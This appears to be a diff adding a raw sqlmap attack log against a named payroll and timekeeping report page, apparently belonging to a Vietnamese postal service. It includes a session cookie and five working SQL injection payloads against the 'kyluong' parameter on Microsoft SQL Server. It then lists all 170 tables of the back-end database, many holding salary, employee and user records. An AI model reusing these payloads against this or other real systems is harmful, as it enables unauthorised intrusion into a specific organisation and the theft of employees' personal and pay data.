@@ -1,0 +1,222 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11.3#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:01:24 /2025-11-17/
+
+[1/1] URL:
+GET http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng
+Cookie: ASP.NET_SessionId=lswqd4itz5u4ftzm3jcmjfio
+do you want to test this URL? [Y/n/q]
+> Y
+[19:01:25] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kyluong (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: kyluong=112025' AND 2784=(SELECT (CASE WHEN (2784=2784) THEN 2784 ELSE (SELECT 7134 UNION SELECT 5563) END))-- gZAK&MA_DV=KVMB&TEN_DV=Kho v%E1%BA%ADn mi%E1%BB%81n b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC Khai th%C3%A1c TC&MA_TO=VP&TEN_TO=V%C4%83n ph%C3%B2ng
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: kyluong=112025' AND 4111 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (4111=4111) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(120)+CHAR(113))) AND 'mddd'='mddd&MA_DV=KVMB&TEN_DV=Kho v%E1%BA%ADn mi%E1%BB%81n b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC Khai th%C3%A1c TC&MA_TO=VP&TEN_TO=V%C4%83n ph%C3%B2ng
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: kyluong=112025';WAITFOR DELAY '0:0:5'--&MA_DV=KVMB&TEN_DV=Kho v%E1%BA%ADn mi%E1%BB%81n b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC Khai th%C3%A1c TC&MA_TO=VP&TEN_TO=V%C4%83n ph%C3%B2ng
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
+    Payload: kyluong=112025' WAITFOR DELAY '0:0:5'--&MA_DV=KVMB&TEN_DV=Kho v%E1%BA%ADn mi%E1%BB%81n b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC Khai th%C3%A1c TC&MA_TO=VP&TEN_TO=V%C4%83n ph%C3%B2ng
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: kyluong=112025' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(112)+CHAR(113)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(99)+CHAR(75)+CHAR(114)+CHAR(82)+CHAR(104)+CHAR(102)+CHAR(72)+CHAR(83)+CHAR(98)+CHAR(106)+CHAR(81)+CHAR(102)+CHAR(74)+CHAR(72)+CHAR(83)+CHAR(98)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(69)+CHAR(67)+CHAR(81)+CHAR(82)+CHAR(82)+CHAR(122)+CHAR(100)+CHAR(104)+CHAR(78)+CHAR(81)+CHAR(113)+CHAR(110)+CHAR(114)+CHAR(111)+CHAR(104)+CHAR(68)+CHAR(110)+CHAR(111)+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(120)+CHAR(113)-- kFjk&MA_DV=KVMB&TEN_DV=Kho v%E1%BA%ADn mi%E1%BB%81n b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC Khai th%C3%A1c TC&MA_TO=VP&TEN_TO=V%C4%83n ph%C3%B2ng
+---
+do you want to exploit this SQL injection? [Y/n] Y
+web server operating system: Windows 11 or 2019 or 2022 or 2016 or 10
+web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
+back-end DBMS: Microsoft SQL Server 2017
+Database: NSTL
+[170 tables]
++-----------------------------+
+| BO_PHAN                     |
+| CAPNHAT_NV_DV               |
+| CAPNHAT_NV_DV               |
+| CAPNHAT_VKKG                |
+| CC_CANHAN_OLD               |
+| CC_CANHAN_OLD               |
+| CC_DONVI                    |
+| CC_DUONGTHU_OLD             |
+| CC_DUONGTHU_OLD             |
+| CC_LT_KT                    |
+| CC_NHOM_TIEUCHI_TT          |
+| CC_THANG                    |
+| CC_TO                       |
+| CHUC_DANH                   |
+| CHUC_VU                     |
+| DM_CHAMDIEM_CN              |
+| DM_CHUCDANH_NS              |
+| DM_CHUCDANH_NS              |
+| DM_CHUCDANH_TC              |
+| DM_DONGIA_DT_BCK            |
+| DM_DONGIA_DT_BCK            |
+| DM_DUONGTHU_BCK             |
+| DM_DUONGTHU_BCK             |
+| DM_DVT                      |
+| DM_HT_BHXH                  |
+| DM_HT_TRALUONG              |
+| DM_LUONG_KHAC               |
+| DM_NGANHANG                 |
+| DM_NGAYCONG                 |
+| DM_NGAYLE_CC                |
+| DM_NGUON_CHI                |
+| DM_NHOM_QUYLUONG            |
+| DM_XE_DV                    |
+| DM_XE_DV                    |
+| DM_YESNO                    |
+| DON_VI                      |
+| DirectoryTree               |
+| KHOI                        |
+| K_0717                      |
+| K_CANHAN                    |
+| LOGFILES                    |
+| LUONGT1                     |
+| LUONGT3a                    |
+| LUONGT3a                    |
+| L_BOPHAN                    |
+| L_CANHAN_KHAC               |
+| L_CANHAN_KHAC               |
+| L_DONVI                     |
+| L_KHOI                      |
+| L_QUYLUONG                  |
+| L_THANGDV                   |
+| L_THANGDV                   |
+| L_TOBP                      |
+| NGAYCONG                    |
+| NHAN_VIEN                   |
+| NS_MUCDO_BCK                |
+| NS_MUCDO_BCK                |
+| NS_TIEUCHI_BCK              |
+| NS_TIEUCHI_BCK              |
+| PL_NHANVIEN                 |
+| PTC_V_NHAN_VIEN             |
+| QTTHUE                      |
+| QT_CONG_VIEC_VAI_TRO        |
+| QT_CONG_VIEC_VAI_TRO        |
+| QT_LUU_VET                  |
+| QT_TIM_KIEM                 |
+| QT_USERS_VAI_TRO            |
+| QT_USERS_VAI_TRO            |
+| QT_VAI_TRO                  |
+| QT_XEM_LUONG                |
+| RPT_FIELDS_BS               |
+| RPT_FIELDS_DV               |
+| RPT_FIELDS_KHAC             |
+| RPT_FIELDS_NV               |
+| RPT_LEV01                   |
+| RPT_LEV02                   |
+| RPT_LEV03                   |
+| RPT_LEV04                   |
+| RPT_MAUBIEU                 |
+| Restore_1018a               |
+| Restore_1018a               |
+| Restore_1018b               |
+| Restore_1018c               |
+| Restore_1018d               |
+| TB_CHAMCONG_NV_CC           |
+| TB_CHAMCONG_NV_LUU_CC       |
+| TB_DN_NGAYCONGHC_CC         |
+| TB_DOC_HAI_CC               |
+| TB_IMPORT_DH_TAM_CC         |
+| TB_IMPORT_NC_TAM_CC         |
+| TB_SANLUONG_BCKT            |
+| TB_SANLUONG_DTU_C3          |
+| TB_SANLUONG_DVKH            |
+| TB_THEMGIO_CC               |
+| TC_GTGC                     |
+| TC_HS_GTGC                  |
+| TC_NVTK                     |
+| THAM_SO                     |
+| TMP_BC_02_a                 |
+| TMP_BC_02_a                 |
+| TMP_BC_02_b                 |
+| TMP_BC_03_a                 |
+| TMP_BC_03_a                 |
+| TMP_BC_03_b                 |
+| TMP_BC_03_c                 |
+| TMP_BC_03_d                 |
+| TMP_BC_03_x                 |
+| TMP_CL_1017                 |
+| TMP_L_CANHAN                |
+| TMP_TB_CC_DT                |
+| TO_BP                       |
+| V_CB_LUONG_BOPHAN           |
+| V_CB_LUONG_BP               |
+| V_CB_LUONG_DONVI            |
+| V_CB_LUONG_DV               |
+| V_CC_CANHAN                 |
+| V_CC_NHANVIEN               |
+| V_CDP_BD                    |
+| V_CDP_DV                    |
+| V_CHAM_CONG                 |
+| V_CHUC_DANH                 |
+| V_CHUYEN_BO_SUNG            |
+| V_CHUYEN_NGOAIGIO_CADEM     |
+| V_CHUYEN_NH_K_CANHAN        |
+| V_CHUYEN_NH_K_CANHAN        |
+| V_CHUYEN_NH_K_CANHAN        |
+| V_DM_CHUCDANH_TC            |
+| V_DM_CHUCDANH_TC            |
+| V_DS_NHANVIEN               |
+| V_DS_NV_XUATFILE            |
+| V_DT_NHANVIEN_NEW           |
+| V_DT_NHANVIEN_NEW           |
+| V_LD_CM_BP                  |
+| V_LD_CM_DV                  |
+| V_LD_CM_TO                  |
+| V_LOAI_CC                   |
+| V_LUONG_BS                  |
+| V_LUONG_CN_DV               |
+| V_LUONG_CN_DV               |
+| V_LUONG_CN_KHAC             |
+| V_LUONG_KHOICN              |
+| V_LUONG_MOI                 |
+| V_L_BOPHAN                  |
+| V_L_CANHAN                  |
+| V_NGAY_CONG_CN              |
+| V_QTTHUE                    |
+| V_TK_LUONG_BOPHAN           |
+| V_TK_LUONG_BP               |
+| V_TK_LUONG_DONVI            |
+| V_TK_LUONG_DV               |
+| V_TK_NC                     |
+| V_TK_NGAY_CONG_XUAT_FILE_RG |
+| V_TK_NGAY_CONG_XUAT_FILE_RG |
+| V_TT_NHANVIEN_BCK           |
+| V_TT_NHANVIEN_BCK           |
+| V_TT_NHAN_VIEN              |
+| V_TT_TO                     |
+| V_TT_USERS                  |
+| V_T_PHANLOAI                |
+| V_USERS_CONG_VIEC           |
+| V_XEM_LUONG                 |
+| V_XUATFILE_TC               |
+| bang_luong_2016             |
+| bang_luong_2016             |
+| bang_luong_bck              |
+| cham_cong_bck               |
+| cham_cong_bck               |
+| l_canhandv2                 |
+| l_canhandv2                 |
+| test_sqli                   |
++-----------------------------+
+
+
+[*] ending @ 19:02:17 /2025-11-17/
+
